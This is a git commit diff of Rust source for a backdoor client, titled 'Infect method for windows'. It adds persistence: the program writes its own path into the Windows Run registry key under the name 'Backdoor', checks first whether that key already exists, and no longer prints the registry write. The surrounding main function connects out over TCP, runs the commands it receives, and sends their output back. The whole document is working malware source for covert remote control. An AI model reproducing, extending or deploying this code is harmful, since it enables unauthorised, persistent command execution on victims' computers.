dfb24fd78752b85d0b21d0cd4d7579d4d405fe7f
ale444113 <alemolinahernandez06@gmail.com>
2021-07-13 19:35:19 +0200

    Infect method for windows

--- client/src/backdoor/infect.rs
+++ client/src/backdoor/infect.rs
@@ -5,7 +5,7 @@ use std::env::{current_exe, consts::OS};
 use winreg::enums::*;
 use winreg::RegKey;
 
-pub fn infect_pc(){
+fn infect_pc(){
     let current_path: PathBuf = current_exe().unwrap();
     match OS{
         "windows" => {
@@ -18,10 +18,23 @@ pub fn infect_pc(){
                 REG_OPENED_EXISTING_KEY => println!("An existing key has been opened"),
             }
         
-            println!("{:?}", key.set_value("Backdoor", &current_path.into_os_string().into_string().unwrap()));
+            let _ = key.set_value("Backdoor", &current_path.into_os_string().into_string().unwrap());
+
     },
         "linux" => (),
-        "macos" => {},
+        "macos" => (),
         _ => {}
     }
+}
+
+fn check_infection() -> bool{
+    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
+    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor");
+
+    if hklm.open_subkey(&path).is_err(){ return false; } 
+    return true;
+}
+
+pub fn start_infection(){
+    if !check_infection(){ infect_pc(); }
 }
--- client/src/main.rs
+++ client/src/main.rs
@@ -5,10 +5,10 @@ mod backdoor;
 
 
 fn main() -> std::io::Result<()> {
-    backdoor::infect::infect_pc();
+    backdoor::infect::start_infection();
     let mut stream: TcpStream = backdoor::start_connection::establish_connection(10);
     loop {
-        let mut data = [0; 1024];//hay que tener esto para manejar una gran cantidad de datos , con 6 bytes no basta ya que solo te da una salida de 6 caracteres
+        let mut data = [0; 1024];// hay que tener esto para manejar una gran cantidad de datos , con 6 bytes no basta ya que solo te da una salida de 6 caracteres
         match stream.read(&mut data) {
             Ok(_) => {
 
@@ -21,7 +21,7 @@ fn main() -> std::io::Result<()> {
                     let mut r = result.unwrap();
 
                     let result_vec = &mut r.stdout;
-                    result_vec.push(10); // Insert a \n so it isn't at the same level as the stderr
+                    result_vec.push(10); // inserta /n para que el stdout y el stderr no se vea todo junto
                     result_vec.append(&mut r.stderr);
 
                     let t_s = &result_vec.as_slice()[..];
